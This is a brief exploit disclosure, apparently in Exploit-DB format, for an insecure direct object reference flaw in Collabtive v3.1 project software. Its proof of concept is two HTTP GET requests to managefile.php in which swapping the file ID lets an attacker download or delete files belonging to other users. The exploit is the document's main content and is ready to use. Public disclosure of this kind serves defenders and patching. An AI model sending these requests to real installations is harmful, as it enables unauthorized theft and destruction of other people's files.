# Exploit Title: Collabtive v3.1 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://github.com/philippK-de/Collabtive
## Tested on: Debian Linux, Apache, Mysql
## Vendor: philippK-de
## Version: v3.1
## Exploit Description:
## Collabtive v3.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to download/delete the file that owned by other user(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
GET /managefile.php?action=downloadfile&id=1(ATTACK'S PROJECT ID)&file=7(CHANGE HERE) HTTP/1.1
```
```
GET /managefile.php?action=delete&id=1(ATTACK'S PROJECT ID)&file=1(CHANGE HERE) HTTP/1.1
```